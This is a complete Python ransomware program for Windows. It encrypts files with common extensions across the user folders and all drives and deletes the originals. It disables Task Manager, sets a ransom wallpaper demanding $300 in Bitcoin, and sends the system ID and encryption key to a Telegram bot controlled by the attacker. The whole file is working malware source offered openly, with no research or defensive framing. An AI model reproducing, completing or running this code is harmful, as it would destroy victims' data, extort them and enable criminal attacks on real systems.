import os
import hashlib
from cryptography.fernet import Fernet
import requests
import subprocess
import winreg
import random
import string
import platform
import ctypes
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import uuid
from PIL import Image, ImageDraw, ImageFont

FILE_EXTENSIONS = [
    ".txt", ".docx", ".xlsx", ".pdf", ".pptx", ".jpg", ".png", ".csv", ".db",
    ".json", ".xml", ".mp3", ".mp4", ".zip", ".rar", ".sql", ".html", ".php"
]

EXCLUDED_DIRECTORIES = [
    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Users\\Public",
    "C:\\Recovery", "C:\\ProgramData", "C:\\Boot"
]

MAX_THREADS = 20
TIMEOUT = 5

def generate_encryption_key():
    key = Fernet.generate_key()
    key_hash = hashlib.sha256(key).hexdigest()
    with open("encryption.key", "w") as key_file:
        key_file.write(key_hash)
    return key

def send_telegram_message(message):
    bot_token = "TELEGRAM BOT API TOKEN"
    chat_id = "TELEGRAM CHAT ID"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    requests.post(url, data=data)

def encrypt_file(file_path, key):
    try:
        cipher = Fernet(key)
        with open(file_path, "rb") as file:
            content = file.read()
        encrypted_content = cipher.encrypt(content)
        new_name = os.path.join(os.path.dirname(file_path), generate_random_name() + ".enc")
        with open(new_name, "wb") as file:
            file.write(encrypted_content)
        os.remove(file_path)
    except PermissionError:
        pass
    except Exception:
        pass

def encrypt_directory(directory, key):
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for root, _, files in os.walk(directory, topdown=True, onerror=lambda e: None):
            if any(os.path.commonprefix([root, excl]) == excl for excl in EXCLUDED_DIRECTORIES):
                continue
            for file in files:
                file_path = os.path.join(root, file)
                if any(file.endswith(ext) for ext in FILE_EXTENSIONS):
                    futures.append(executor.submit(encrypt_file, file_path, key))
        for future in as_completed(futures, timeout=TIMEOUT):
            try:
                future.result()
            except Exception:
                pass

def get_user_directories():
    user_home = os.path.expanduser("~")
    directories = [
        os.path.join(user_home, "Desktop"),
        os.path.join(user_home, "Documents"),
        os.path.join(user_home, "Downloads"),
        os.path.join(user_home, "Pictures"),
        os.path.join(user_home, "Music"),
        os.path.join(user_home, "Videos"),
    ]
    for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive_path = f"{drive}:/"
        if os.path.exists(drive_path):
            directories.append(drive_path)
    return directories

def generate_random_name(length=10):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_system_id():
    mac = uuid.getnode()
    system = platform.system()
    version = platform.release()
    raw_data = f"{mac}{system}{version}"
    return hashlib.sha256(raw_data.encode()).hexdigest()[:10]

def create_ransom_background(system_id):
    width, height = 1920, 1080
    image = Image.new("RGB", (width, height), "black")
    draw = ImageDraw.Draw(image)

    try:
        font_path = "C:/Windows/Fonts/arial.ttf"
        font = ImageFont.truetype(font_path, 50)
    except:
        font = ImageFont.load_default()

    ransom_message = f"""
    [!] YOUR FILES HAVE BEEN ENCRYPTED
    Send $300 in BTC to the following address:
    1FzWLkYX1Bz6PkpA5J5bZkLU5Rz5ZuXKhV
    Contact our support on Telegram to receive the decryption key.
    System ID: {system_id}
    """

    draw.text((200, 300), ransom_message, fill="red", font=font)
    
    ransom_image_path = os.path.join(os.environ["TEMP"], "ransom_background.jpg")
    image.save(ransom_image_path)
    return ransom_image_path

def set_ransom_background(system_id):
    background_path = create_ransom_background(system_id)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, background_path, 3)

def disable_wallpaper_change():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Wallpaper", 0, winreg.REG_SZ, "C:/path/to/your/image.jpg")
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "2")
        winreg.SetValueEx(key, "NoDispBackgroundPage", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception:
        pass

def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except Exception:
        pass

if __name__ == '__main__':
    encryption_key = generate_encryption_key()
    disable_task_manager()
    system_id = generate_system_id()
    send_telegram_message(f"‼️ Ransomware executed.\n ℹ️ System ID: {system_id}\n ℹ️ Key: {encryption_key.decode()}")
    set_ransom_background(system_id)
    directories = get_user_directories()
    for directory in directories:
        if os.path.exists(directory):
            encrypt_directory(directory, encryption_key)
    disable_wallpaper_change()
